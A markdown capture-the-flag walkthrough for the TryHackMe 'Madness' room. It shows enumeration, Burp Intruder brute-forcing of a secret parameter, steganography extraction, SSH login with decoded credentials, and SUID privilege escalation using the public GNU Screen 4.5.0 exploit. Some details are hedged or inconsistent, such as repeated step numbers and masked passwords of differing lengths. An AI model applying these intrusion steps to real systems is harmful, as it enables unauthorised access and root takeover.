@@ -1,0 +1,296 @@
+# 🧠 TryHackMe - Madness Room (Full Walkthrough)
+
+
+## 📌 Objective
+
+Explore a machine with limited clues. Use smart enumeration, identify hidden files, crack ciphers, and escalate privileges to gain full root access. The goal is to capture:
+
+* 🧍‍♂️ `user.txt`
+* 👑 `root.txt`
+
+Ping the target IP to check connectivity:
+
+```
+ping <TARGET_IP>
+```
+
+---
+
+## 🔍 Step 1: Nmap Scan (Find Open Ports)
+
+```
+nmap -A -T4 <TARGET_IP>
+```
+
+**Result:**
+
+* Port 22 → SSH
+* Port 80 → HTTP (Apache server)
+
+This means we have a website hosted and SSH running.
+
+---
+
+## 🌐 Step 2: Web Enumeration
+
+### 2.1 Visit the website
+
+Open `http://<TARGET_IP>` in your browser.
+You'll see the default **Apache2 Ubuntu** page. Nothing exciting here.
+
+### 2.2 Check Page Source
+
+Right-click > View Page Source.
+
+👉 At the bottom, you’ll find a comment:
+
+```html
+<!-- Check out this image: thm.jpg -->
+```
+
+### 2.3 Download the Image
+
+```bash
+wget http://<TARGET_IP>/thm.jpg
+```
+
+---
+
+## 🖼️ Step 3: Image File Analysis
+
+Check the file type:
+
+```
+file thm.jpg
+```
+
+You might get:
+
+```
+thm.jpg: PNG image data, ...
+```
+
+Wait — **file extension is `.jpg`** but type is **PNG**?
+
+### 3.1 Fix the Extension
+
+Rename file:
+
+```
+mv thm.jpg thm.png
+```
+
+Try opening it with any image viewer. It works ✅
+
+Look closely at the image or use:
+
+```
+strings thm.png | less
+```
+
+Sometimes the image might hint at a **hidden directory**.
+
+Let’s say you find something like:
+
+```
+/th1s_1s_h1dd3n/
+```
+
+---
+
+## 🚪 Step 4: Hidden Directory & Secret Parameter
+
+Visit:
+
+```
+http://<TARGET_IP>/th1s_1s_h1dd3n/
+```
+
+You’ll see:
+
+```
+You need to provide the correct secret key between 0 and 99.
+```
+
+🔐 Step 4: Brute-force the Secret Parameter (with Burp Suite)
+Find the correct secret parameter value (0–99) by intercepting the request using Burp Suite
+
+#4.1 Intercept the Request
+
+Open Burp Suite and configure your browser to use it as a proxy.
+
+Visit:
+
+   ```
+   http://<TARGET_IP>/th1s_1s_h1dd3n/?secret=0
+   ```
+
+3. In Burp, intercept the request like:
+
+   ```
+   GET /th1s_1s_h1dd3n/?secret=0 HTTP/1.1
+   Host: <TARGET_IP>
+   User-Agent: Mozilla/5.0 ...
+   ```
+
+4. Send the request to **Intruder**:
+
+   * Right-click on the request → *Send to Intruder*
+
+---
+
+#### 4.2 Configure Intruder Payload
+
+* **Target Tab**: Already filled (keep default)
+* **Positions Tab**:
+
+  * Click “Clear”
+  * Select only the value `0` in `secret=0`
+  * Click “Add”
+* It should now look like:
+
+  ```
+  /th1s_1s_h1dd3n/?secret=§0§
+  ```
+
+---
+
+#### 4.3 Set the Payload
+
+* Go to **Payloads Tab**
+* Payload type: *Numbers*
+
+  * From: `0`
+  * To: `99`
+  * Step: `1`
+
+---
+
+#### 4.4 Start the Attack
+
+* Click “Start Attack”
+* Look for response differences in **Length** or **Status**
+
+**Example Output:**
+
+| Request | Payload | Length                             |
+| ------- | ------- | ---------------------------------- |
+| #73     | 73      | 105    ← 🎯 Different from others! |
+
+When `secret=73`, the response length or content will be different, revealing:
+
+> `Here is your file: secret_steg.jpg`
+
+
+
+## 🧩 Step 5: Steganography – Hidden Data in Image
+
+Download the new file:
+
+```
+wget http://<TARGET_IP>/th1s_1s_h1dd3n/secret_steg.jpg
+```
+
+Now, try to extract hidden data:
+
+```
+steghide extract -sf secret_steg.jpg
+```
+
+It will ask for a password → Enter: `73`
+
+✅ File extracted: `secret.txt`
+
+---
+
+## 🔓 Step 6: Decode the Secret (ROT13)
+
+Inside `secret.txt`, you find something like:
+
+```
+Username: wbxre
+Password: ########
+```
+
+This is encoded using **ROT13**.
+
+Use any ROT13 decoder or command:
+
+```bash
+echo "wbxre" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+```
+
+Decoded:
+
+* Username → **joker**
+* Password → **#######**
+
+---
+
+## 🔐 Step 7: SSH Login
+
+Now try logging in:
+
+```
+ssh joker@<TARGET_IP>
+```
+
+Use password: `######`
+
+You’re in ✅
+
+Check for user flag:
+
+```
+cat user.txt
+```
+
+---
+
+## 🔼 Step 8: Privilege Escalation
+
+### 8.1 Check Sudo Rights
+
+```
+sudo -l
+```
+
+No luck?
+
+### 8.2 Check SUID Binaries
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+You may find:
+
+```
+/usr/bin/screen-4.5.0
+```
+
+Search this binary in [Exploit-DB](https://www.exploit-db.com):
+
+👉 **GNU Screen 4.5.0 - Local Privilege Escalation**
+
+Download & compile the exploit:
+
+```
+gcc exploit.c -o screenroot
+./screenroot
+```
+
+🎉 You're root now!
+
+```
+whoami
+# root
+```
+
+Get the final flag:
+
+```
+cat /root/root.txt
+```
+
+
